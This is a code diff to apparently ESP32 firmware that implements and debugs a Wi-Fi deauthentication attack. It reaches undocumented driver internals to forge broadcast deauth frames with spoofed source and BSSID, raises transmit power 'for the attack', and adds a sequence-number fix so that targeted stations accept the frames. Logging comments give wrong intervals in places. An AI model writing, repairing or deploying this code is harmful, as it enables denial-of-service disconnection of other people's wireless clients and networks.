@@ -54,9 +54,21 @@ void startDeauth(const uint8_t* mac) {
     // Note: the driver reads *adjacent* BSS words (&g_ic+16 / &g_ic+20 hold the STA/AP hmac pointers),
     // not fields of the ic struct itself. Panic inside send_setup if the word is 0, so fall back to AP.
     uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);   // STA hmac (panic if 0)
-    if (!slotWord) slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);   // fall back to AP
+    if (!slotWord) { 
+        slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);   // fall back to AP
+        
+        // DIAGNOSTIC: Log fallback to AP path every time
+        if (serialRoom(70))
+            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth start FALLBACK to AP slot\"}\n");
+    }
     memcpy(deauth.slotPad, &slotWord, 4);
     deauth.hstate = *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312);
+    
+    // DIAGNOSTIC: Log hstate value once at start (critical for understanding address mapping)
+    if (serialRoom(90))
+        Serial.printf("{\"t\":\"log\",\"msg\":\"deauth start hstate=0x%02x slot=0x%x ch=%d\"}\n", 
+                     deauth.hstate, slotWord, ch);
+    
     deauth.active = true;
     portEXIT_CRITICAL(&g_devMux);
     (void)esp_wifi_set_max_tx_power(160);   // 16 dBm for the attack (startWifi's 8.2 dBm is tuned for quiet sniffing, not for range)
@@ -154,14 +166,34 @@ extern "C" int chm_is_at_home_channel(void);   // ROM fn, no args: 1 = radio on 
 //   else:      A4=A6=AP   A5=bcast(DA)
 void sendInternalKick() {
     static const uint8_t kBcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    // DIAGNOSTIC: Count each allocation attempt vs successful completion (helps determine if alloc fails)
+    static uint32_t allocCount = 0;
+    ++allocCount;
+    
     void* desc = ieee80211_alloc_deauth(deauth.slotPad, kBcastMac, 7);   // arg1 likely unused; reason 7 lands at D+24
-    if (!desc) { deauth.txFail = deauth.txFail + 1; return; }
+    if (!desc) { 
+        deauth.txFail = deauth.txFail + 1; 
+        
+        // DIAGNOSTIC: Log allocation failure pattern (every 50th time to avoid spam)
+        if ((allocCount & 63u) == 0 && serialRoom(80))
+            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth alloc fail #%lu hstate=0x%02x\"}\n", 
+                         allocCount, deauth.hstate);
+        return; 
+    }
     // Mirror send_deauth_no_bss's ebuf-header bit juggling: desc[+4] holds the ebuf pointer P, and the
     // bits live in the first word P points at. A 0 here means this core's descriptor layout is not the one
     // these offsets were derived from: bail instead of dereferencing it, and instead of TXing a frame we
     // could not patch (the spoofed SA/BSSID is written through P below).
     const uint32_t P = *reinterpret_cast<const volatile uint32_t*>(reinterpret_cast<char*>(desc) + 4);
-    if (!P) { deauth.txFail = deauth.txFail + 1; return; }
+    if (!P) { 
+        deauth.txFail = deauth.txFail + 1; 
+        
+        // DIAGNOSTIC: Log invalid pointer every 50th time
+        if ((allocCount & 63u) == 0 && serialRoom(80))
+            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth alloc #%lu P=0 null hstate=0x%02x\"}\n", 
+                         allocCount, deauth.hstate);
+        return; 
+    }
     {
         volatile uint32_t* ebw = reinterpret_cast<volatile uint32_t*>(P);
         uint32_t v = *ebw;
@@ -192,26 +224,47 @@ void sendInternalKick() {
         // type 2 / subtype 12 = a QoS-Null data frame: stations ignore it, so nothing was ever kicked.)
         D[off] = 0xC0;  D[1 + off] = 0x00;
         D[2 + off] = 0x32;  D[3 + off] = 0x00;   // duration 50 us, as real APs emit
-        // DIAGNOSTIC: dump the frame exactly as it will be handed to the MAC, once per attack, so the
-        // host can tell "frame is wrong" apart from "frame is right but the PHY never radiated".
-        if (!deauth.dumped && serialRoom(240)) {
-            deauth.dumped = true;
-            char hex[3 * 32 + 1];
-            const uint16_t flen = *reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20);
-            for (int i = 0; i < 32; i++) snprintf(hex + i * 3, 4, "%02x ", D[off + i]);
-            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth frame off=%u len=%u d40=%04x: %s\"}\n",
-                          static_cast<unsigned>(off), flen,
-                          *reinterpret_cast<const volatile uint16_t*>(reinterpret_cast<char*>(desc) + 40), hex);
+        
+        // CRITICAL FIX: Set unique sequence number per frame - without this all frames appear as duplicates
+        // Match the pattern from sendKickFrame: seq occupies bits 7-4 of byte 23 (high nibble)
+        static uint32_t frameSeq = 0;
+        const uint32_t s = ((frameSeq & 0x0FFFu) << 4);   // shift left 4 bits
+        D[off + 22] = static_cast<uint8_t>(s >> 4);       // byte 22 gets low 8 bits of shifted value
+        D[off + 23] = static_cast<uint8_t>(s & 0xF0);     // byte 23 gets high nibble
+        ++frameSeq;                                       // increment for next frame (sequence wraps at 4095)
+
+                // DIAGNOSTIC: Log sequence number periodically (every 4th frame uses less buffer space than full dump)
+        static uint32_t seqLogCount = 0;
+        if ((seqLogCount & 3u) == 0 && serialRoom(60)) {
+            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth seq=0x%02x%02x #%lu\"}\n", 
+                         D[off + 22], D[off + 23], frameSeq - 1);
+
         }
     }
     *reinterpret_cast<volatile uint16_t*>(reinterpret_cast<char*>(desc) + 20) = 26;   // len 24→26 so the reason code fits on air (ppTxPkt prepends an 8-byte prefix)
-    if (chm_is_at_home_channel()) ic_tx_pkt(desc);                   // TX now…
-    else {                                                            // …or append to the deferred queue at g_ic+440 (tail of .next slots)
+    
+    // DIAGNOSTIC: Track TX path decision and completion count
+    static uint32_t txPathLog = 0;
+    bool goingToDeferred = !chm_is_at_home_channel();
+    if (goingToDeferred) {
         char** tailSlot = reinterpret_cast<char**>(reinterpret_cast<char*>(&g_ic) + 440);
         *reinterpret_cast<volatile uint32_t*>(reinterpret_cast<char*>(desc) + 52) = 0;
         *reinterpret_cast<volatile uint32_t*>(*tailSlot) = reinterpret_cast<uint32_t>(desc);
         *tailSlot = reinterpret_cast<char*>(desc) + 52;
+        
+        // Log deferred queue decision every 20th frame to verify path taken
+        if ((txPathLog & 15u) == 0 && serialRoom(60))
+            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth #%lu DEFERRED q=0x%lx\"}\n", 
+                         txPathLog, *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 440));
+    } else {
+        if (chm_is_at_home_channel()) ic_tx_pkt(desc);                   // TX now…
+        
+        // Log immediate TX every 16th frame
+        if ((txPathLog & 15u) == 0 && serialRoom(40))
+            Serial.printf("{\"t\":\"log\",\"msg\":\"deauth #%lu IMMEDIATE home=1\"}\n", 
+                         txPathLog);
     }
+    ++txPathLog;
     deauth.sent = deauth.sent + 1;
 }
 
